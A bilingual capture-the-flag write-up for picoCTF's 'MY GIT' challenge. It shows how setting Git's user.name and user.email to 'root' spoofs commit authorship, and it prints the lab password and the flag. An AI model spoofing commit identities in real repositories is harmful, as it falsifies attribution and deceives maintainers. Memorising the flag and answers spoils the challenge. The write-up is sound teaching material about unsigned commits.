# Write-Up : MY GIT

---

## 🇫🇷 Version Française

### 📋 Informations du Challenge

- **Nom du challenge :** MY GIT[cite: 15]
- **Plateforme / Événement :** picoCTF 2026[cite: 15]
- **Auteur :** Darkraicg492[cite: 15]
- **Catégorie :** General Skills[cite: 15]
- **Difficulté :** Easy[cite: 15]

---

### 📝 Description

> _"I have built my own Git server with my own rules! You can clone the challenge repo using the command below. git clone ssh://git@xebec.cylabacademy.net:19948/git/challenge.git Here's the password: e7273499. Check the README to get your flag!"_[cite: 15]

---

### 🔍 Étape 1 : Clonage du dépôt et lecture du `README.md`

On commence par cloner le dépôt Git distant hébergé sur le serveur avec la commande `git clone`[cite: 15] :

```bash
git clone ssh://git@xebec.cylabacademy.net:19948/git/challenge.git
```

_(Mot de passe : `e7273499`)_[cite: 15]

On accède au dossier du projet et on affiche le contenu du fichier `README.md` :

```bash
cd challenge
cat README.md
```

**Contenu du README :**

> _"If you want the flag, make sure to push the flag! Only flag.txt pushed by `root:root@academy` will be updated with the flag."_

---

### 🛠️ Étape 2 : Usurpation de l'identité Git et création du commit

En suivant l'indice du challenge (_"How do you specify your Git username and email?"_)[cite: 15] et les instructions du README, on configure l'identité de l'auteur Git localement dans le dépôt afin d'usurper le compte `root` :

```bash
git config user.name "root"
git config user.email "root@academy"
```

Ensuite, on crée le fichier requis `flag.txt`, puis on l'ajoute à l'index et on crée un commit :

```bash
touch flag.txt
git add .
git commit -m "flag"
```

---

### 🚩 Étape 3 : Push et récupération du Flag

On pousse les modifications vers le serveur distant avec la commande `git push` :

```bash
git push
```

**Sortie du serveur (Hook Git) :**

```text
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: academy{1mp3rs0n4t4_g17_345y_848d6f9d}
```

**Flag :** `academy{1mp3rs0n4t4_g17_345y_848d6f9d}`

---

### 💡 Key Takeaways / Notions retenues

- Dans Git, les métadonnées d'auteur (`user.name` et `user.email`) ne sont pas vérifiées par défaut et peuvent être facilement modifiées localement avec `git config`.
- Sans signature cryptographique (comme les clés GPG) ou mécanismes d'authentification renforcés, l'identité de l'auteur d'un commit Git peut être usurpée (_Impersonation_).

---

---

## 🇬🇧 English Version

### 📋 Challenge Info

- **Challenge Name:** MY GIT[cite: 15]
- **Platform / Event:** picoCTF 2026[cite: 15]
- **Author:** Darkraicg492[cite: 15]
- **Category:** General Skills[cite: 15]
- **Difficulty:** Easy[cite: 15]

---

### 📝 Description

> _"I have built my own Git server with my own rules! You can clone the challenge repo using the command below. git clone ssh://git@xebec.cylabacademy.net:19948/git/challenge.git Here's the password: e7273499. Check the README to get your flag!"_[cite: 15]

---

### 🔍 Step 1: Repository Cloning & README Inspection

We clone the remote Git repository hosted on the server using `git clone`[cite: 15]:

```bash
git clone ssh://git@xebec.cylabacademy.net:19948/git/challenge.git
```

_(Password: `e7273499`)_[cite: 15]

We navigate to the cloned project directory and inspect `README.md`:

```bash
cd challenge
cat README.md
```

**README Content:**

> _"If you want the flag, make sure to push the flag! Only flag.txt pushed by `root:root@academy` will be updated with the flag."_

---

### 🛠️ Step 2: Git Identity Impersonation & Commit Creation

Referencing the challenge hint (_"How do you specify your Git username and email?"_)[cite: 15] and the requirements in `README.md`, we configure the local Git commit author identity to impersonate `root`:

```bash
git config user.name "root"
git config user.email "root@academy"
```

Next, we create the requested `flag.txt` file, stage it, and commit the change:

```bash
touch flag.txt
git add .
git commit -m "flag"
```

---

### 🚩 Step 3: Pushing Commit & Flag Retrieval

We push the new commit to the remote repository using `git push`:

```bash
git push
```

**Remote Hook Output:**

```text
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: academy{1mp3rs0n4t4_g17_345y_848d6f9d}
```

**Flag:** `academy{1mp3rs0n4t4_g17_345y_848d6f9d}`

---

### 💡 Key Takeaways

- Git author details (`user.name` and `user.email`) are purely self-declared locally via `git config` and can be easily spoofed.
- Without GPG signature verification or strict server-side hook authentication, commit authors can be impersonated within Git repositories.
